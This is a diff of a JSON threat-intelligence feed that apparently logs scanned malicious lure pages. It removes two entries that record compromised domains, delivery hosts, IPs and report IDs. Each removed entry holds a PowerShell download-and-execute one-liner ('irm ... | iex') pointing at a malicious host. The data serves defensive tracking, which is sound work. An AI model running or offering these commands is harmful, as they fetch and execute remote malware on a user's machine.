@@ -8258,46 +8258,5 @@
     ],
     "ReportId": "cmwaqbhyx022q0oml78i982wh",
     "ScannedAt": "2026-11-10T13:31:52.884000+00:00"
-  },
-  {
-    "UrlDomain": "kurti.fr",
-    "DeliveryUrl": [
-      "t-trustresnew.com"
-    ],
-    "PayloadUrl": [
-      "https://t-trustresnew.com/click/437fcc74237f6eaa"
-    ],
-    "IP": [
-      "109.234.166.207"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://t-trustresnew[.]com/click/437fcc74237f6eaa')|iex",
-    "ResolvedDownloadUrl": [
-      "https://t-trustresnew.com/click/437fcc74237f6eaa"
-    ],
-    "ReportId": "cmwaofa4901pv0oml2dv9jutk",
-    "ScannedAt": "2026-11-10T12:38:50.099000+00:00"
-  },
-  {
-    "UrlDomain": "productosalimenticiosarucas.es",
-    "DeliveryUrl": [
-      "browse-nnccodes.beer"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "91.108.98.213"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-nnccodes.beer/api.php?s=a3946e3ded820e3d2f02885bf63c8a3a176d58bb9403b402&_v=29905231",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "irm 'browse-nnccodes.beer/e42e22c5e92d53e7'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-nnccodes.beer/e42e22c5e92d53e7"
-    ],
-    "ReportId": "cmwao8o3p01la0omlmotcq335",
-    "ScannedAt": "2026-11-10T12:33:41.704000+00:00"
   }
 ]
